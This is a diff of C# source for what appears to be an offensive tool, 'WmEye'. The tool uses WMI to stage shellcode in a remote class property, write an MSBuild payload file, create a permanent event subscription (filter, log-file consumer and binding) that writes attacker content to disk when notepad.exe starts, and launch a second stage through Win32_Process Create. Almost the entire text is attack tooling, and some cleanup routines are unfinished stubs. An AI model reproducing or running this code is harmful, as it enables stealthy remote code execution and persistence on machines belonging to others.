@@ -1,4 +1,4 @@
-﻿/*
+/*
  * - Create a Remote WMI Class
  * - Write Shellcode as property value to the Class
  * - Write MSBuild File Content as value to another Class
@@ -33,8 +33,9 @@ namespace WmEye
             // Handle CLI Args 
 
             UploadShellcode();
-            UploadBuildFile();
-            ExecuteStageOne();
+            ConsumerSeUpload();
+         //   UploadBuildFile();
+          //  ExecuteStageOne();
             ExecuteStageTwo();
           
             // Scope Cleanup Method
@@ -48,7 +49,7 @@ namespace WmEye
         private static string FileUploadTempWMIClassName = "Win32_OSRecoveryConfigurationFiles";
         private static string FileUploadTempWMIPropertyName = "Description";
 
-        private static string writePath = "Z:\\temp\\BuildConfig.xml";
+        private static string writePath = "Z:\\BuildConfig.xml";
 
         private static string InitiateConnection(ref ManagementScope scope, string host, string user, string password, string wmiNamespace)
         {
@@ -100,6 +101,98 @@ namespace WmEye
 
 
 
+        public static void Consumertwo(string data)
+        {
+
+            Console.WriteLine(data);
+
+            ManagementObject myEventFilter = null;
+            ManagementObject myEventConsumer = null;
+            ManagementObject myBinder = null;
+
+            try
+            {
+
+                // want a filter which executes immediately 
+                // Check for instance of a created evil class ?
+
+                ManagementScope scope = new ManagementScope(@"\\.\root\subscription");
+
+                ManagementClass wmiEventFilter = new ManagementClass(scope, new
+                ManagementPath("__EventFilter"), null);
+                String strQuery = @"SELECT * FROM __InstanceCreationEvent WITHIN 5 " +
+        "WHERE TargetInstance ISA \"Win32_Process\" " +
+        "AND TargetInstance.Name = \"notepad.exe\"";
+
+                WqlEventQuery myEventQuery = new WqlEventQuery(strQuery);
+                myEventFilter = wmiEventFilter.CreateInstance();
+                myEventFilter["Name"] = "demoEventFilter";
+                myEventFilter["Query"] = myEventQuery.QueryString;
+                myEventFilter["QueryLanguage"] = myEventQuery.QueryLanguage;
+                myEventFilter["EventNameSpace"] = @"\root\cimv2";
+                myEventFilter.Put();
+                Console.WriteLine("[*] Event filter created.");
+
+                myEventConsumer =
+                new ManagementClass(scope, new ManagementPath("LogFileEventConsumer"),
+                null).CreateInstance();
+                myEventConsumer["Name"] = "LogFile";
+                myEventConsumer["Filename"] = "Z:\\wmi\\magic.xml";
+                myEventConsumer["Text"] = data;
+                myEventConsumer.Put();
+
+                Console.WriteLine("[*] Event consumer created.");
+
+                myBinder =
+                new ManagementClass(scope, new ManagementPath("__FilterToConsumerBinding"),
+                null).CreateInstance();
+                myBinder["Filter"] = myEventFilter.Path.RelativePath;
+                myBinder["Consumer"] = myEventConsumer.Path.RelativePath;
+                myBinder.Put();
+
+                Console.WriteLine("[*] Subscription created");
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e);
+            } // END CATCH
+
+        }
+
+
+
+        public static void ConsumerSeUpload()
+        {
+
+           string uploadFile = "Z:\\build.xml";
+            
+            if (!File.Exists(uploadFile))
+            {
+                Console.WriteLine("[-] Specified local file does not exist, not running PS runspace\n");
+            }
+          string content = File.ReadAllText(uploadFile);
+
+          //  string originalWMIProperty = Convert.ToBase64String(uploadFileBytes);
+
+            Console.WriteLine(content);
+
+            Consumertwo(content);
+
+            CleanFilter();
+
+
+        }
+
+
+       public static void CleanFilter()
+        {
+
+            Console.WriteLine("Remove the Event Filter after File is Written");
+      
+        // Check if File is written, if yes, remove the filter 
+        
+        }
+
         public static void UploadShellcode()
         {
 
@@ -139,12 +232,12 @@ namespace WmEye
 
 
 
-        public static void UploadBuildFile()
+        /* public static void UploadBuildFile()
         {
 
             // Write MSBuild XML File to Target
 
-            string uploadFile = "Z:\\BuildConfig.xml";
+            string uploadFile = "Z:\\test.xml";
          
            
 
@@ -217,7 +310,9 @@ namespace WmEye
             Console.WriteLine("[X] Config File Written");
 
 
-        } 
+        } // closing Stageone
+
+        */
 
         public static void ExecuteStageTwo()
         {
@@ -239,11 +334,11 @@ namespace WmEye
             ManagementBaseObject outParams2 = classInstance2.InvokeMethod("Create", inParams2, null);
 
 
-        } 
+        }
+
 
 
 
     } 
 
 } 
-
